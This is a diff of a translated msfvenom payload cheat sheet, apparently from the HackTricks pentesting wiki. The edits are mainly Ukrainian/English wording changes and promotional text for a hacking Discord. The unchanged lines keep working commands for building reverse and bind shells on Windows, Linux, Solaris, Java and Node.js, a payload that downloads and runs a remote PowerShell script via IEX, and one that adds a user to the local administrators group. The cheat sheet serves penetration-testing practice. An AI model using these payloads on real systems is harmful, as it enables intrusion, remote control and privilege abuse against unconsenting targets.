@@ -20,13 +20,13 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
 **Hacking Insights**\
-Залучайте контент, який занурюється в захоплення та виклики хакінгу
+Engage with content that delves into the thrill and challenges of hacking
 
 **Real-Time Hack News**\
-Будьте в курсі швидкоплинного світу хакінгу через новини та інсайти в реальному часі
+Keep up-to-date with fast-paced hacking world through real-time news and insights
 
 **Latest Announcements**\
-Залишайтеся в курсі нових програм винагород за вразливості та важливих оновлень платформ
+Stay informed with the newest bug bounties launching and crucial platform updates
 
 **Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
@@ -36,7 +36,7 @@ Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to 
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-One can also use the `-a` to specify the architecture or the `--platform`
+Також можна використовувати `-a`, щоб вказати архітектуру, або `--platform`
 
 ## Listing
 ```bash
@@ -67,8 +67,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-{% endcode %}
-
 ### Створити користувача
 
 {% code overflow="wrap" %}
@@ -88,7 +86,7 @@ msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ex
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
-### Encoder
+### Кодер
 
 {% code overflow="wrap" %}
 ```bash
@@ -106,7 +104,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 
 ## Linux Payloads
 
-### Зворотний шелл
+### Зворотний Шелл
 
 {% code overflow="wrap" %}
 ```bash
@@ -129,9 +127,9 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```
 {% endcode %}
 
-## **MAC Пейлоади**
+## **MAC Payloads**
 
-### **Зворотний Шелл:** 
+### **Зворотний шелл:**
 
 {% code overflow="wrap" %}
 ```bash
@@ -195,7 +193,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Скриптові мови навантаження**
+## **Скриптові мови payloads**
 
 ### **Perl**
 
@@ -222,7 +220,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 **Інсайти з хакінгу**\
 Залучайтеся до контенту, який занурюється у захоплення та виклики хакінгу
 
-**Новини про хакінг в реальному часі**\
+**Новини про хакінг у реальному часі**\
 Будьте в курсі швидкоплинного світу хакінгу через новини та інсайти в реальному часі
 
 **Останні оголошення**\
